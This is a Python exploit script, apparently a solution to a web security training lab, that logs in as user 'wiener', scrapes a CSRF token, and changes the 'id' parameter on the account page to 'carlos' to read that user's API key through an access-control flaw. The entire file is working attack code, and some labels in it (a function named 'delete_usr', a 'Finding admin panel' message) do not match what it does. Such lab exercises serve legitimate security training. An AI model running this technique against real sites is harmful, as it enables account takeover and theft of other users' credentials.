import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def get_csrf_token(url,s):
    req = s.get(url,proxies=proxies,verify=False)
    soup = BeautifulSoup(req.text,'lxml')
    csrf = soup.find('input',{'name':'csrf'})['value']
    return csrf

def delete_usr(url,s):
    print("(+) Trying login with wiener username...")
    login_url = url + '/login'
    csrf = get_csrf_token(login_url,s)
    data = {
        'csrf':csrf,
        'username':'wiener',
        'password' : 'peter'
    }
    ##& getting cookies session for login
    req = s.post(login_url, data= data,proxies = proxies,verify=False)
    res =req.text
    if "Log out" in res:
        print("(+) Successfully logged in with wiener username")
        print("(+) Changing username parameter...")
        myaccount_url = url + '/my-account?id=carlos'
        req = s.get(myaccount_url,proxies = proxies,verify=False,allow_redirects=False)
        res = req.text
        if "carlos" in res:
            print("(+) Extracting carlos api key...")
            soup = BeautifulSoup(req.text, 'lxml')
            apiLine = soup.find(string=re.compile("Your API Key is:"))
            api_key = re.search(r"Your API Key is: (.*)", apiLine).group(1)
            print("Api Key is: %s" % api_key)
        else:
            print("(+) Can't get carlos info from response")
    else:
        print("(+) Can't Login with wiener")




def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0].split('/')[-1]} URL")
        print(f"Example: {sys.argv[0].split('/')[-1]} www.example.com")
        sys.exit(-1)
    
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    s = requests.Session()
    delete_usr(url, s)



if __name__ == '__main__':
    main()